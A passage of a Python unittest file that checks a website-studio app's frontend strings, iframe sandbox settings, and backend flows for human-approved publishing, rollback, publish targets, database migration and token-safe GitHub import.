        self.assertIn("maverick.app.selection-changed", app_source)
        self.assertIn("resolveSelection", app_source)
        self.assertIn("route && !route.page_id ? undefined : pages[0]", app_source)
        self.assertIn("previewRoute: page?.route || route?.route || nextRoute || '/'", app_source)
        self.assertIn("WebsiteInfoPanel", app_source)
        self.assertIn("infoPanelOpen", app_source)
        self.assertIn("website_info", app_source)
        self.assertNotIn("PreviewStatus", app_source)
        self.assertNotIn("SiteStatusPanel", app_source)
        self.assertNotIn("fullscreenPreviewOpen", app_source)
        self.assertNotIn("fullscreen_preview", app_source)
        self.assertNotIn("preview_website", app_source)
        self.assertNotIn("website-fullscreen-preview", app_source)
        self.assertIn("runtime_status", app_source)
        self.assertIn("missing_requirements", app_source)
        self.assertIn("cachedWorkspaceSnapshot", app_source)
        self.assertIn("action: 'site_status'", app_source)
        self.assertIn("action: 'list_changes'", app_source)
        self.assertIn("loadSiteDetails", app_source)
        self.assertIn("previewPayloadFromRecord", app_source)
        self.assertIn("include_html: false", app_source)
        self.assertIn("previewLoading", app_source)
        self.assertIn("setPreviewLoading(true)", app_source)
        self.assertIn("setPreviewLoading(false)", app_source)
        self.assertIn("PreviewLoadingState", app_source)
        self.assertIn("Preview is loading", app_source)
        self.assertIn("bootstrap.active_site_id || requestedSite || persistedSite || availableSites[0]?.id || ''", app_source)
        self.assertIn("active_view: activeView", app_source)
        self.assertIn("context_tool: 'website_page_context'", app_source)
        self.assertIn("normalizePreviewUrl(previewState?.preview_url || '', activeTarget)", app_source)
        self.assertIn("navigateLoadedSite", app_source)
        self.assertIn("previewCacheRef", app_source)
        self.assertIn("WarmPreviewFrame", app_source)
        self.assertIn("website-studio.preview.navigate", app_source)
        self.assertIn("PREVIEW_CLIENT_VERSION", app_source)
        self.assertIn("client_version", app_source)
        self.assertIn("previewUrl || previewHtml", app_source)
        self.assertIn("sandbox=\"allow-scripts allow-same-origin\"", app_source)
        self.assertIn("data-preview-url={previewUrl}", app_source)
        self.assertIn("srcDoc={previewHtml}", app_source)

    def test_preview_runtime_frontend_uses_backend_document_and_opaque_inner_frame(self) -> None:
        runtime_source = (APP_ROOT / "frontend" / "public" / "preview-runtime" / "index.html").read_text(encoding="utf-8")

        self.assertIn("action: 'preview_document'", runtime_source)
        self.assertIn("preview_id: previewId", runtime_source)
        self.assertIn("URL.createObjectURL", runtime_source)
        self.assertIn("normalizePreviewDocument", runtime_source)
        self.assertIn("normalizeCssUrls", runtime_source)
        self.assertIn("normalizeInlineMediaUrls", runtime_source)
        self.assertIn("normalizedMediaDocumentUrl", runtime_source)
        self.assertIn("text/html;charset=utf-8", runtime_source)
        self.assertIn("loadPreviewDocument", runtime_source)
        self.assertIn("documentCache", runtime_source)
        self.assertIn("assetGatewayCache", runtime_source)
        self.assertIn("assetBlobCache", runtime_source)
        self.assertIn("website-studio.preview.asset-cache-warm", runtime_source)
        self.assertIn("asset_blob_cache", runtime_source)
        self.assertIn("credentials: 'omit'", runtime_source)
        self.assertIn("website-studio.preview.navigate", runtime_source)
        self.assertIn("website-studio.preview.target", runtime_source)
        self.assertIn("__WEBSITE_STUDIO_PREVIEW_REPORT__", runtime_source)
        self.assertIn("maverick.website-studio.preview-report", runtime_source)
        self.assertIn("document.fonts.ready", runtime_source)
        self.assertIn("getComputedStyle", runtime_source)
        self.assertIn("website-studio.preview.report", runtime_source)
        self.assertIn("asset_broker", runtime_source)
        self.assertIn("__WEBSITE_STUDIO_PREVIEW_FILE_GATEWAY_SOURCE__", runtime_source)
        self.assertIn("__WEBSITE_STUDIO_PREVIEW_BACKEND_SOURCE__", runtime_source)
        self.assertIn("/api/apps/website-studio/backend/file/", runtime_source)
        self.assertNotIn("website-studio.asset.request", runtime_source)
        self.assertNotIn("website-studio.asset.response", runtime_source)
        self.assertNotIn("X-Website-Studio-Preview-Broker", runtime_source)
        self.assertNotIn("credentials: 'include'", runtime_source)
        self.assertNotIn("async function normalizePreviewDocument", runtime_source)
        self.assertNotIn("parentBrokeredMediaAsset", runtime_source)
        self.assertNotIn("parentBrokeredMediaUrl", runtime_source)
        self.assertNotIn("dataUrlFromBytes", runtime_source)
        self.assertNotIn("response.arrayBuffer", runtime_source)
        self.assertNotIn("credentials: 'same-origin'", runtime_source)
        self.assertIn("URL.createObjectURL(blob)", runtime_source)
        self.assertNotIn("asset materialization failed", runtime_source)
        self.assertNotIn("currentAssetUrls", runtime_source)
        self.assertNotIn("fetchMediaText", runtime_source)
        self.assertNotIn("method: 'HEAD'", runtime_source)
        self.assertNotIn("shouldMaterializeElementAsset", runtime_source)
        self.assertNotIn("STREAMING_MEDIA_EXTENSIONS", runtime_source)
        self.assertNotIn("blobUrlForMedia", runtime_source)
        self.assertIn("__WEBSITE_STUDIO_PREVIEW_MEDIA_SOURCE__", runtime_source)
        self.assertIn("/api/apps/website-studio/backend/media", runtime_source)
        self.assertIn('sandbox="allow-scripts allow-forms"', runtime_source)
        self.assertNotIn("allow-popups", runtime_source)
        self.assertNotIn("allow-same-origin", runtime_source)
        self.assertIn("const frameCache = new Map()", runtime_source)
        self.assertIn("const frameCacheLimit = 8", runtime_source)
        self.assertIn("activateCachedPreviewFrame", runtime_source)
        self.assertIn("entry.frame.src = entry.documentUrl", runtime_source)

    def test_connection_onboarding_is_owned_by_website_ops_skill(self) -> None:
        app_source = (APP_ROOT / "frontend" / "src" / "App.tsx").read_text(encoding="utf-8")
        skill_source = (APP_ROOT / "skills" / "website-ops" / "SKILL.md").read_text(encoding="utf-8")

        self.assertNotIn("action: 'git_connection_prepare'", app_source)
        self.assertNotIn("action: 'import_git'", app_source)
        self.assertIn("website_git_connection_prepare", skill_source)
        self.assertIn("website_git_connection_activate", skill_source)
        self.assertIn("website_import_git", skill_source)
        self.assertIn("website_import_zip", skill_source)
        self.assertIn("github-token", skill_source)
        self.assertIn("ZIP di Drive/Storage", skill_source)

    def test_frontend_refreshes_on_app_data_changed_events(self) -> None:
        app_source = (APP_ROOT / "frontend" / "src" / "App.tsx").read_text(encoding="utf-8")
        api_source = (APP_ROOT / "frontend" / "src" / "api.ts").read_text(encoding="utf-8")

        self.assertIn("maverick.app.data-changed", app_source)
        self.assertIn("owner_app_id === 'website-studio'", app_source)
        self.assertIn("previewCacheRef.current.clear()", app_source)
        self.assertIn("resetPreview: resetsPreview", app_source)
        self.assertIn("freshSnapshot === initialSnapshot", app_source)
        self.assertIn("snapshotAbortRef.current?.abort()", app_source)
        self.assertIn("sessionStorage.removeItem(key)", api_source)
        self.assertIn("existing.signal === options.signal", api_source)
        self.assertIn("snapshotRequests.get(key)?.promise === fresh", api_source)

    def test_frontend_and_sidebar_do_not_select_archived_sites(self) -> None:
        app_source = (APP_ROOT / "frontend" / "src" / "App.tsx").read_text(encoding="utf-8")
        widget_source = (APP_ROOT / "frontend" / "src" / "widgets" / "website-studio-sitemap-sidebar" / "main.tsx").read_text(encoding="utf-8")

        self.assertIn("availableSites = bootstrap.sites.filter((site) => site.status !== 'archived')", app_source)
        self.assertIn("const selectableSites = nextSites.filter((item) => item.status !== 'archived')", widget_source)
        self.assertIn("bootstrap.active_site_id || requestedSite || persistedSite || availableSites[0]?.id || ''", app_source)
        self.assertIn("requestedSite || persistedSite || selectableSites.find", widget_source)
        self.assertNotIn("sitePayload.items[0]?.id", app_source)
        self.assertNotIn("nextSites[0]", widget_source)
        self.assertNotIn("|| sites[0]", widget_source)

    def test_frontend_resolves_storage_writer_dependency(self) -> None:
        api_source = (APP_ROOT / "frontend" / "src" / "api.ts").read_text(encoding="utf-8")
        contract = json.loads((APP_ROOT / "app_contract.json").read_text(encoding="utf-8"))

        self.assertIn("/api/apps/dependencies", api_source)
        self.assertIn("storage-writer", json.dumps(contract.get("requires", [])))
        self.assertNotIn("/api/apps/storage/backend", api_source)

    def test_build_preview_does_not_emit_data_changed_event(self) -> None:
        self.assertEqual(app_events_for_action("build_preview"), [])

    def test_maintenance_prune_dry_run_does_not_emit_data_changed_event(self) -> None:
        self.assertEqual(app_events_for_action("maintenance_prune", {"dry_run": True}), [])
        self.assertEqual(app_events_for_action("maintenance_prune", {"dry_run": "true"}), [])
        self.assertEqual(
            app_events_for_action("maintenance_prune", {"dry_run": False}),
            [{"type": "maverick.app.data-changed", "owner_app_id": "website-studio", "resource": "activity"}],
        )

    def test_frontend_new_site_screen_is_conversation_guide(self) -> None:
        app_source = (APP_ROOT / "frontend" / "src" / "App.tsx").read_text(encoding="utf-8")

        self.assertIn("connection-guide", app_source)
        self.assertIn("Ask an agent to connect a website.", app_source)
        self.assertIn("Drive ZIP import", app_source)
        self.assertIn("secret saved in", app_source)
        self.assertNotIn("handleZipDrop", app_source)
        self.assertNotIn("onDrop={handleZipDrop}", app_source)
        self.assertNotIn("Drop ZIP", app_source)
        self.assertNotIn("Connect Git", app_source)

    def test_phase1_frontend_and_widgets_follow_operational_design_rules(self) -> None:
        app_source = (APP_ROOT / "frontend" / "src" / "App.tsx").read_text(encoding="utf-8")
        styles = (APP_ROOT / "frontend" / "src" / "styles.css").read_text(encoding="utf-8")
        preview_runtime = (APP_ROOT / "frontend" / "public" / "preview-runtime" / "index.html").read_text(encoding="utf-8")
        sitemap_widget = (APP_ROOT / "frontend" / "src" / "widgets" / "website-studio-sitemap-sidebar" / "main.tsx").read_text(encoding="utf-8")
        sitemap_widget_styles = (APP_ROOT / "frontend" / "src" / "widgets" / "website-studio-sitemap-sidebar" / "styles.css").read_text(encoding="utf-8")
        sitemap_widget_html = (APP_ROOT / "frontend" / "widgets" / "website-studio-sitemap-sidebar" / "index.html").read_text(encoding="utf-8")
        footer_widget = (APP_ROOT / "frontend" / "public" / "widgets" / "website-studio-sidebar-footer" / "index.html").read_text(encoding="utf-8")

        self.assertIn("--website-studio-bg: var(--maverick-bg)", styles)
        self.assertIn("height: 100dvh", styles)
        self.assertIn("overflow: hidden", styles)
        self.assertIn("connection-guide", app_source)
        self.assertIn(".connection-guide", styles)
        self.assertIn(".preview-loading-state", styles)
        self.assertIn("website-studio-preview-loading-morph", styles)
        self.assertIn("prefers-reduced-motion", styles)
        self.assertNotIn("Drop ZIP", app_source)
        self.assertNotIn("Connect Git", app_source)
        self.assertNotIn("upload_file", app_source)
        self.assertNotIn("commit", app_source)
        self.assertIn("website-studio-sitemap-search-icon", sitemap_widget)
        self.assertIn("website-studio-sitemap-search-icon", sitemap_widget_styles)
        self.assertNotIn("material-symbols-rounded", sitemap_widget)
        self.assertNotIn("material-symbols-rounded", sitemap_widget_styles)
        self.assertNotIn("material-symbols-rounded", sitemap_widget_html)
        self.assertNotIn("Material Symbols Rounded", sitemap_widget)
        self.assertNotIn("Material Symbols Rounded", sitemap_widget_styles)
        self.assertNotIn("Material Symbols Rounded", sitemap_widget_html)
        self.assertIn("icon-add", footer_widget)
        self.assertNotIn("icon-preview", footer_widget)
        self.assertIn("icon-info", footer_widget)
        self.assertIn(".icon-info { display: grid; place-items: center; font-size: .86rem", footer_widget)
        self.assertNotIn("material-symbols-rounded", footer_widget)
        self.assertNotIn("Material Symbols Rounded", footer_widget)
        self.assertNotIn('id="status"', preview_runtime)
        self.assertNotIn("renderStatus", preview_runtime)
        self.assertNotIn("website-fullscreen-preview", app_source)
        self.assertNotIn("website-fullscreen-preview", styles)
        for forbidden in {"Commit", "Push", "Deploy", "Publish", "Rollback"}:
            self.assertNotIn(f">{forbidden}<", app_source)
        self.assertLess(sitemap_widget.index("website-studio-sitemap-search"), sitemap_widget.index("website-studio-sitemap-select-frame"))
        self.assertIn("maverick.widget.open-app", sitemap_widget)
        self.assertIn("app_page: `${appPageKind}/${id}`", sitemap_widget)
        self.assertIn("TreeProvider", sitemap_widget)
        self.assertIn("TreeView", sitemap_widget)
        self.assertIn("WebsiteTreeNodeView", sitemap_widget)
        self.assertIn("TreeNodeTrigger", sitemap_widget)
        self.assertIn("TreeExpander", sitemap_widget)
        self.assertIn("TreeIcon", sitemap_widget)
        self.assertIn("TreeLabel", sitemap_widget)
        self.assertIn("storage-folder-tree", sitemap_widget)
        self.assertIn("storage-folder-tree .rounded-md", sitemap_widget_styles)
        self.assertIn("Components", sitemap_widget)
        self.assertIn("Sections", sitemap_widget)
        self.assertNotIn("Backend and config", sitemap_widget)
        self.assertNotIn("Assets", sitemap_widget)
        self.assertIn("Status", sitemap_widget)
        self.assertIn("Warnings", sitemap_widget)
        self.assertIn("website-studio-tree-badge.changed", sitemap_widget_styles)
        self.assertIn("params.page_id", sitemap_widget)
        self.assertIn("params.route_id", sitemap_widget)
        self.assertIn("params.target_selector", sitemap_widget)
        self.assertIn("params.component_id", sitemap_widget)
        self.assertIn("grid-template-columns: minmax(0, 1fr) 2.65rem", footer_widget)
        self.assertIn("<span>New</span>", footer_widget)
        self.assertNotIn("<span>Preview</span>", footer_widget)
        self.assertNotIn('id="preview"', footer_widget)
        self.assertNotIn("openPreview", footer_widget)
        self.assertIn('aria-label="Info"', footer_widget)
        self.assertIn("openInfoPanel", footer_widget)
        self.assertIn("website_info: '1'", footer_widget)
        self.assertIn("app_page: 'info'", footer_widget)
        self.assertIn("label: 'New'", footer_widget)
        self.assertIn("height: '2.65rem'", footer_widget)
        self.assertNotIn("New website", footer_widget)
        self.assertNotIn("Preview website", footer_widget)
        self.assertNotIn("open_in_full", footer_widget)
        self.assertNotIn("fullscreen_preview", footer_widget)
        self.assertIn("maverick.widget.resize", footer_widget)
        self.assertIn("maverick.shell.sidebar.close", footer_widget)

    def test_phase2_approval_publish_and_rollback_flow(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            status, created = handle_action(data_root, {"action": "site_create", "display_name": "Acme"})
            self.assertEqual(status, 201)
            site_id = created["site"]["id"]
            initial_revision_id = created["site"]["active_revision_id"]
            _edit_index(data_root, site_id, marker="Published")

            status, publish_request = handle_action(data_root, {"action": "publish_request", "site_id": site_id, "requested_by": "agent"})
            self.assertEqual(status, 201)
            request_id = publish_request["publish_request"]["id"]
            self.assertTrue(publish_request["publish_request"]["build_id"])

            status, approval_payload = handle_action(
                data_root,
                {
                    "action": "approval_record",
                    "site_id": site_id,
                    "approval_action": "publish",
                    "target_id": request_id,
                    "approved_by": "user:owner",
                    "_app_actor": _approval_actor(),
                    "confirm": True,
                },
            )
            self.assertEqual(status, 201)

            status, published = handle_action(
                data_root,
                {
                    "action": "publish",
                    "site_id": site_id,
                    "publish_request_id": request_id,
                    "approval_id": approval_payload["approval"]["id"],
                },
            )
            self.assertEqual(status, 200)
            self.assertFalse(published["blocked"])
            self.assertEqual(published["status"], "published")
            self.assertEqual(published["publish_request"]["status"], "published")
            self.assertEqual(published["deployment"]["status"], "published")
            self.assertEqual(published["deployment"]["mode"], "maverick_managed_static")

            status, diff = handle_action(data_root, {"action": "diff", "site_id": site_id})
            self.assertEqual(status, 200)
            self.assertEqual(diff["files"], [])

            status, rollback_approval = handle_action(
                data_root,
                {
                    "action": "approval_record",
                    "site_id": site_id,
                    "approval_action": "rollback",
                    "target_id": initial_revision_id,
                    "approved_by": "user:owner",
                    "_app_actor": _approval_actor(),
                    "confirm": True,
                },
            )
            self.assertEqual(status, 201)
            status, rolled_back = handle_action(
                data_root,
                {
                    "action": "rollback",
                    "site_id": site_id,
                    "revision_id": initial_revision_id,
                    "approval_id": rollback_approval["approval"]["id"],
                    "confirm": True,
                },
            )
            self.assertEqual(status, 200)
            self.assertFalse(rolled_back["blocked"])
            self.assertEqual(rolled_back["deployment"]["status"], "rolled_back")
            status, file_payload = handle_action(data_root, {"action": "read_file", "site_id": site_id, "path": "index.html"})
            self.assertEqual(status, 200)
            self.assertNotIn("Published", file_payload["file"]["content"])

            status, changes = handle_action(data_root, {"action": "list_changes", "site_id": site_id})
            self.assertEqual(status, 200)
            self.assertTrue(changes["approval_events"])
            self.assertTrue(changes["builds"])
            self.assertTrue(changes["deployments"])

    def test_phase2_publish_request_records_human_policy_and_blocks_without_confirm(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            status, created = handle_action(data_root, {"action": "site_create", "display_name": "Policy"})
            self.assertEqual(status, 201)
            site_id = created["site"]["id"]
            _edit_index(data_root, site_id, marker="Policy")

            status, request_payload = handle_action(data_root, {"action": "publish_request", "site_id": site_id})
            self.assertEqual(status, 201)
            self.assertEqual(request_payload["publish_request"]["approval_policy"], "human_required")

            status, blocked = handle_action(
                data_root,
                {
                    "action": "approval_record",
                    "site_id": site_id,
                    "approval_action": "publish",
                    "target_id": request_payload["publish_request"]["id"],
                    "approved_by": "user:owner",
                    "_app_actor": _approval_actor(),
                    "confirm": False,
                },
            )
            self.assertEqual(status, 400)
            self.assertIn("confirm=true", blocked["detail"])

            status, unauthenticated = handle_action(
                data_root,
                {
                    "action": "approval_record",
                    "site_id": site_id,
                    "approval_action": "publish",
                    "target_id": request_payload["publish_request"]["id"],
                    "approved_by": "user:owner",
                    "confirm": True,
                },
            )
            self.assertEqual(status, 400)
            self.assertIn("authenticated Maverick user actor", unauthenticated["detail"])

            status, unauthorized = handle_action(
                data_root,
                {
                    "action": "approval_record",
                    "site_id": site_id,
                    "approval_action": "publish",
                    "target_id": request_payload["publish_request"]["id"],
                    "approved_by": "user:member",
                    "confirm": True,
                    "_app_actor": _approval_actor(user_id="user:member", workspace_role="member"),
                },
            )
            self.assertEqual(status, 400)
            self.assertIn("owner/admin", unauthorized["detail"])

    def test_phase3_managed_static_publish_target_creates_artifact_record(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            status, created = handle_action(data_root, {"action": "site_create", "display_name": "Hosted"})
            self.assertEqual(status, 201)
            site_id = created["site"]["id"]
            status, target_payload = handle_action(data_root, {"action": "publish_target_configure", "site_id": site_id, "kind": "managed_static"})
            self.assertEqual(status, 200)
            self.assertEqual(target_payload["publish_target"]["kind"], "managed_static")
            self.assertEqual(target_payload["publish_target"]["config"]["platform_surface"], "generic_static_hosting")
            _edit_index(data_root, site_id, marker="Hosted")

            status, request_payload = handle_action(data_root, {"action": "publish_request", "site_id": site_id, "requested_by": "agent"})
            self.assertEqual(status, 201)
            status, approval_payload = handle_action(
                data_root,
                {
                    "action": "approval_record",
                    "site_id": site_id,
                    "approval_action": "publish",
                    "target_id": request_payload["publish_request"]["id"],
                    "approved_by": "user:owner",
                    "_app_actor": _approval_actor(),
                    "confirm": True,
                },
            )
            self.assertEqual(status, 201)
            status, published = handle_action(
                data_root,
                {
                    "action": "publish",
                    "site_id": site_id,
                    "publish_request_id": request_payload["publish_request"]["id"],
                    "approval_id": approval_payload["approval"]["id"],
                },
            )
            self.assertEqual(status, 200)
            self.assertEqual(published["deployment"]["mode"], "maverick_managed_static")
            source_ref = published["deployment"]["source_ref"]
            self.assertEqual(source_ref["provider"], "maverick-managed-static")
            self.assertEqual(source_ref["status"], "artifact_ready")
            self.assertEqual(source_ref["platform_binding_status"], "pending_generic_surface")
            self.assertFalse(source_ref["platform_binding"]["public_binding_ready"])
            self.assertIn("stable public URL", source_ref["platform_binding"]["missing_requirements"])
            artifact_index = data_root / source_ref["artifact_root"] / "index.html"
            self.assertTrue(artifact_index.exists())
            self.assertIn("Hosted", artifact_index.read_text(encoding="utf-8"))

            status, targets = handle_action(data_root, {"action": "publish_targets_list", "site_id": site_id})
            self.assertEqual(status, 200)
            self.assertEqual([item["id"] for item in targets["items"]], [target_payload["publish_target"]["id"]])

    def test_phase3_managed_static_publish_target_records_public_binding_metadata(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            status, created = handle_action(data_root, {"action": "site_create", "display_name": "Bound Hosted"})
            self.assertEqual(status, 201)
            site_id = created["site"]["id"]
            status, target_payload = handle_action(
                data_root,
                {
                    "action": "publish_target_configure",
                    "site_id": site_id,
                    "kind": "managed_static",
                    "config": {
                        "platform_binding_status": "bound",
                        "public_url": "https://bound.example.test/",
                        "custom_domain": "bound.example.test",
                        "certificate_status": "issued",
                        "cache_policy": "static-assets",
                        "cdn_status": "ready",
                        "verification_status": "verified",
                    },
                },
            )
            self.assertEqual(status, 200)
            config = target_payload["publish_target"]["config"]
            self.assertEqual(config["platform_binding_status"], "bound")
            self.assertEqual(config["public_url"], "https://bound.example.test/")
            _edit_index(data_root, site_id, marker="Public")

            status, request_payload = handle_action(data_root, {"action": "publish_request", "site_id": site_id, "requested_by": "agent"})
            self.assertEqual(status, 201)
            status, approval_payload = handle_action(
                data_root,
                {
                    "action": "approval_record",
                    "site_id": site_id,
                    "approval_action": "publish",
                    "target_id": request_payload["publish_request"]["id"],
                    "approved_by": "user:owner",
                    "_app_actor": _approval_actor(),
                    "confirm": True,
                },
            )
            self.assertEqual(status, 201)
            status, published = handle_action(
                data_root,
                {
                    "action": "publish",
                    "site_id": site_id,
                    "publish_request_id": request_payload["publish_request"]["id"],
                    "approval_id": approval_payload["approval"]["id"],
                },
            )

            self.assertEqual(status, 200)
            source_ref = published["deployment"]["source_ref"]
            self.assertEqual(published["deployment"]["mode"], "maverick_managed_static")
            self.assertEqual(source_ref["public_url"], "https://bound.example.test/")
            self.assertEqual(source_ref["custom_domain"], "bound.example.test")
            self.assertEqual(source_ref["platform_binding_status"], "bound")
            self.assertTrue(source_ref["platform_binding"]["public_binding_ready"])
            self.assertEqual(source_ref["platform_binding"]["missing_requirements"], [])
            self.assertEqual(source_ref["platform_binding"]["certificate_status"], "issued")
            self.assertEqual(source_ref["platform_binding"]["cdn_status"], "ready")

    def test_phase3_publish_target_migrates_existing_environment_rows(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            data_root.mkdir(parents=True, exist_ok=True)
            db_path = data_root / "app.sqlite"
            now = "2026-06-04T00:00:00+00:00"
            with closing(sqlite3.connect(db_path)) as db, db:
                db.executescript(
                    """
                    CREATE TABLE schema_metadata (key TEXT PRIMARY KEY, value TEXT NOT NULL);
                    CREATE TABLE sites (
                      id TEXT PRIMARY KEY,
                      display_name TEXT NOT NULL,
                      slug TEXT NOT NULL UNIQUE,
                      status TEXT NOT NULL,
                      primary_domain TEXT NOT NULL DEFAULT '',
                      source_provider TEXT NOT NULL,
                      source_label TEXT NOT NULL DEFAULT '',
                      source_shape TEXT NOT NULL DEFAULT '',
                      source_artifact_ref_json TEXT NOT NULL DEFAULT '{}',
                      default_environment_id TEXT NOT NULL DEFAULT '',
                      working_branch TEXT NOT NULL DEFAULT '',
                      active_revision_id TEXT,
                      published_revision_id TEXT,
                      created_at TEXT NOT NULL,
                      updated_at TEXT NOT NULL,
                      archived_at TEXT
                    );
                    CREATE TABLE environments (
                      id TEXT PRIMARY KEY,
                      site_id TEXT NOT NULL REFERENCES sites(id) ON DELETE CASCADE,
                      name TEXT NOT NULL,
                      kind TEXT NOT NULL,
                      base_url TEXT NOT NULL DEFAULT '',
                      requires_approval INTEGER NOT NULL DEFAULT 1,
                      created_at TEXT NOT NULL,
                      updated_at TEXT NOT NULL
                    );
                    """
                )
                db.execute(
                    """
                    INSERT INTO sites(
                      id, display_name, slug, status, primary_domain, source_provider,
                      source_label, source_shape, source_artifact_ref_json,
                      default_environment_id, working_branch, created_at, updated_at
                    )
                    VALUES ('site_legacy', 'Legacy', 'legacy', 'draft', '', 'manual', '', '', '{}', 'env_legacy_preview', '', ?, ?)
                    """,
                    (now, now),
                )
                db.execute(
                    """
                    INSERT INTO environments(id, site_id, name, kind, base_url, requires_approval, created_at, updated_at)
                    VALUES ('env_legacy_preview', 'site_legacy', 'Preview', 'preview', '', 1, ?, ?)
                    """,
                    (now, now),
                )

            status, target_payload = handle_action(
                data_root,
                {"action": "publish_target_configure", "site_id": "site_legacy", "kind": "managed_static"},
            )

            self.assertEqual(status, 200)
            self.assertEqual(target_payload["publish_target"]["kind"], "managed_static")
            with closing(sqlite3.connect(db_path)) as db, db:
                columns = {row[1] for row in db.execute("PRAGMA table_info(environments)").fetchall()}
            self.assertIn("publish_target_id", columns)
            self.assertIn("last_deployment_id", columns)

    def test_phase2_approval_cannot_be_reused(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            status, created = handle_action(data_root, {"action": "site_create", "display_name": "Reuse"})
            self.assertEqual(status, 201)
            site_id = created["site"]["id"]
            _edit_index(data_root, site_id)
            status, request_payload = handle_action(data_root, {"action": "publish_request", "site_id": site_id})
            self.assertEqual(status, 201)
            request_id = request_payload["publish_request"]["id"]
            status, approval_payload = handle_action(
                data_root,
                {
                    "action": "approval_record",
                    "site_id": site_id,
                    "approval_action": "publish",
                    "target_id": request_id,
                    "approved_by": "user:owner",
                    "_app_actor": _approval_actor(),
                    "confirm": True,
                },
            )
            self.assertEqual(status, 201)
            approval_id = approval_payload["approval"]["id"]
            status, first = handle_action(data_root, {"action": "publish", "site_id": site_id, "publish_request_id": request_id, "approval_id": approval_id})
            self.assertEqual(status, 200)
            status, second = handle_action(data_root, {"action": "publish", "site_id": site_id, "publish_request_id": request_id, "approval_id": approval_id})
            self.assertEqual(status, 400)
            self.assertIn("already published", second["detail"])

    def test_phase2_environments_are_site_scoped(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            status, first = handle_action(data_root, {"action": "site_create", "display_name": "One"})
            self.assertEqual(status, 201)
            status, second = handle_action(data_root, {"action": "site_create", "display_name": "Two"})
            self.assertEqual(status, 201)

            self.assertNotEqual(first["site"]["default_environment_id"], second["site"]["default_environment_id"])
            status, configured = handle_action(
                data_root,
                {
                    "action": "environment_configure",
                    "site_id": first["site"]["id"],
                    "kind": "production",
                    "name": "Production",
                    "base_url": "https://example.com",
                    "requires_approval": True,
                },
            )
            self.assertEqual(status, 200)
            self.assertEqual(configured["environment"]["kind"], "production")
            status, listed = handle_action(data_root, {"action": "environments_list", "site_id": first["site"]["id"]})
            self.assertEqual(status, 200)
            self.assertIn("production", {item["kind"] for item in listed["items"]})

    def test_phase2_git_connection_activation_requires_secret_grant_reference(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            status, prepared = handle_action(data_root, {"action": "git_connection_prepare", "repository_url": "example-org/site-web"})
            self.assertEqual(status, 201)
            connection_id = prepared["connection"]["id"]

            status, blocked = handle_action(data_root, {"action": "git_connection_activate", "connection_id": connection_id, "grant_id": "grant_123"})
            self.assertEqual(status, 400)
            self.assertIn("confirm_no_raw_secret", blocked["detail"])

            status, activated = handle_action(
                data_root,
                {
                    "action": "git_connection_activate",
                    "connection_id": connection_id,
                    "grant_id": "grant_123",
                    "confirm_no_raw_secret": True,
                },
            )
            self.assertEqual(status, 200)
            self.assertEqual(activated["connection"]["status"], "grant_configured")

    def test_private_github_import_uses_vault_delivered_token_without_command_line_secret(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            status, prepared = handle_action(data_root, {"action": "git_connection_prepare", "repository_url": "example-org/private-site"})
            self.assertEqual(status, 201)
            calls: list[tuple[list[str], dict[str, str]]] = []

            def fake_run(command, check, capture_output, text, timeout, env):
                calls.append((list(command), dict(env)))
                self.assertNotIn("test-private-token", " ".join(command))
                self.assertEqual(env["WEBSITE_STUDIO_GIT_TOKEN"], "test-private-token")
                self.assertTrue(Path(env["GIT_ASKPASS"]).exists())
                clone_root = Path(command[-1])
                clone_root.mkdir(parents=True)
                (clone_root / ".git").mkdir()
                (clone_root / "index.html").write_text("<title>Private</title>", encoding="utf-8")
                return subprocess.CompletedProcess(command, 0, "", "")

            with patch("backend.store.subprocess.run", fake_run):
                status, imported = handle_action(
                    data_root,
                    {
                        "action": "import_git",
                        "site_id": prepared["site"]["id"],
                        "repository_url": "https://github.com/example-org/private-site.git",
                        "_app_secrets": {"github-token": "test-private-token"},
                    },
                )

            self.assertEqual(status, 201)
            self.assertEqual(imported["site"]["source_artifact_ref"]["provider"], "github")
            self.assertEqual(imported["site"]["source_artifact_ref"]["connection_id"], prepared["connection"]["id"])
            self.assertEqual(len(calls), 1)
            status, connections = handle_action(data_root, {"action": "git_connections_list", "site_id": prepared["site"]["id"]})
            self.assertEqual(status, 200)
            self.assertEqual(connections["items"][0]["status"], "grant_configured")

    def test_private_github_import_blocks_when_core_secrets_does_not_deliver_token(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            status, prepared = handle_action(data_root, {"action": "git_connection_prepare", "repository_url": "example-org/private-site"})
            self.assertEqual(status, 201)
            status, _activated = handle_action(
                data_root,
                {
                    "action": "git_connection_activate",
                    "connection_id": prepared["connection"]["id"],
                    "grant_id": "grant:default:website-studio:github-token:private-site",
                    "confirm_no_raw_secret": True,
                },
            )
            self.assertEqual(status, 200)

            with patch("backend.store.subprocess.run") as run:
                status, blocked = handle_action(
                    data_root,
                    {
                        "action": "import_git",
                        "site_id": prepared["site"]["id"],
                        "repository_url": "https://github.com/example-org/private-site.git",
                        "_app_secret_errors": [{"logical_name": "github-token"}],
                    },
                )

            self.assertEqual(status, 400)
            self.assertIn("Core Secrets did not deliver", blocked["detail"])
            run.assert_not_called()

    def test_phase2_github_publish_opens_pull_request_with_vault_delivered_token(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            status, prepared = handle_action(data_root, {"action": "git_connection_prepare", "repository_url": "example-org/site-web"})
            self.assertEqual(status, 201)
            site_id = prepared["site"]["id"]
            connection_id = prepared["connection"]["id"]
            status, activated = handle_action(
                data_root,
                {
                    "action": "git_connection_activate",
                    "connection_id": connection_id,
                    "grant_id": "grant:default:website-studio:github-token:test",
                    "confirm_no_raw_secret": True,
                },
            )
            self.assertEqual(status, 200)
            self.assertEqual(activated["connection"]["status"], "grant_configured")
            _edit_index(data_root, site_id, marker="GitHub")
            status, request_payload = handle_action(data_root, {"action": "publish_request", "site_id": site_id})
            self.assertEqual(status, 201)
